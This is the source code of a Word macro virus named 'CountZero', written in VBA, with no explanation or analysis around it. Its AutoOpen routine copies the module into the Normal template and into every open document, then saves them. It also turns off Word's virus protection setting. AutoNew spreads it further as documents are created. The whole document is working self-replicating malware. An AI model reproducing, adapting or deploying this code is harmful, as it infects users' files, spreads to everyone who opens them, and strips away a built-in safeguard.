   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "CountZero"
   Sub AutoOpen()
   Dim vbc As VBComponent
   Dim cm As CodeModule
   Dim vir As CodeModule
   Dim cdoc As Document
   Dim vbiref As Reference
   On Error Resume Next
   If ThisDocument.Name <> NormalTemplate.Name Then
       Set vbc = NormalTemplate.VBProject.VBComponents("CountZero")
       If Err <> 0 Then
           For Each vbiref In ThisDocument.VBProject.References
           If vbiref.Name = "VBIDE" Then
               Exit For
           End If
           Next
           Set vbc = NormalTemplate.VBProject.VBComponents.Add(vbext_ct_StdModule)
           vbc.Name = "CountZero"
           Set cm = vbc.CodeModule
           Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
           cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
           NormalTemplate.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
       Else
           Set cm = vbc.CodeModule
           Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
           If cm.Lines(1, cm.CountOfLines) <> vir.Lines(1, vir.CountOfLines) Then
               For Each vbiref In ThisDocument.VBProject.References
                   If vbiref.Name = "VBIDE" Then
                       Exit For
                   End If
               Next
               Set vbc = NormalTemplate.VBProject.VBComponents.Add(vbext_ct_StdModule)
               vbc.Name = "CountZero"
               Set cm = vbc.CodeModule
               Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
               cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
               NormalTemplate.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
           End If
       End If
   End If
   For Each cdoc In Documents
       Clone cdoc
       cdoc.Save
   Next

   Options.VirusProtection = False
   Application.Activate
   On Error GoTo 0
   End Sub
   Sub Clone(ByRef dest As Document)
   Dim vbiref As Reference
   Dim vbc As VBComponent
   Dim cm As CodeModule
   Dim vir As CodeModule
   On Error Resume Next
   For Each vbiref In ThisDocument.VBProject.References
       If vbiref.Name = "VBIDE" Then
           Exit For
       End If
   Next
   Set vbc = dest.VBProject.VBComponents("CountZero")
   If Err <> 0 Then
       Set vbc = dest.VBProject.VBComponents.Add(vbext_ct_StdModule)
       vbc.Name = "CountZero"
       Set cm = vbc.CodeModule
       Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
       cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
       dest.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
   Else
       Set cm = vbc.CodeModule
       Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
       If cm.Lines(1, cm.CountOfLines) <> vir.Lines(1, vir.CountOfLines) Then
           Set vbc = dest.VBProject.VBComponents.Add(vbext_ct_StdModule)
           vbc.Name = "CountZero"
           Set cm = vbc.CodeModule
           Set vir = ThisDocument.VBProject.VBComponents("CountZero").CodeModule
           cm.InsertLines 1, vir.Lines(1, vir.CountOfLines)
           dest.VBProject.References.AddFromGuid vbiref.GUID, vbiref.Major, vbiref.Minor
       End If
   End If
   End Sub
   Sub AutoNew()
   Dim adoc As Document
       If ThisDocument.Name = NormalTemplate.Name Then
           For Each adoc In Documents
               Clone adoc
           Next
           Application.Activate
       End If
   End Sub
